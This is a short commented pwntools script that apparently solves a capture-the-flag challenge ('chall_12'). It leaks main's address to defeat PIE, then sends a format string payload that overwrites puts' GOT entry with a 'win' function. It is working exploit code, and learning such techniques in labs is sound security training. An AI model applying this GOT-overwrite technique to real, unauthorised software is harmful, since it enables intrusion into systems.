from pwn import *
elf = ELF("./chall_12")
p = process('./chall_12')
# Receiving data from the process until a colon character (":") is encountered and store it in the variable "leak"
p.recvuntil(b':')
leak = p.recv()
# Converting the leaked address from hexadecimal to an integer
intleak = int(leak, 16)
# Calculating the base address of the ELF binary by subtracting the address of the "main" symbol from the leaked address
elf.address = intleak - elf.sym['main']
# Crafting a format string exploit payload with 7 specifiers to write the "win" address into the "puts" function's GOT entry byte by byte
payload = fmtstr_payload(7, {elf.got.puts: elf.sym.win}, write_size='byte')
p.sendline(payload)
p.interactive()

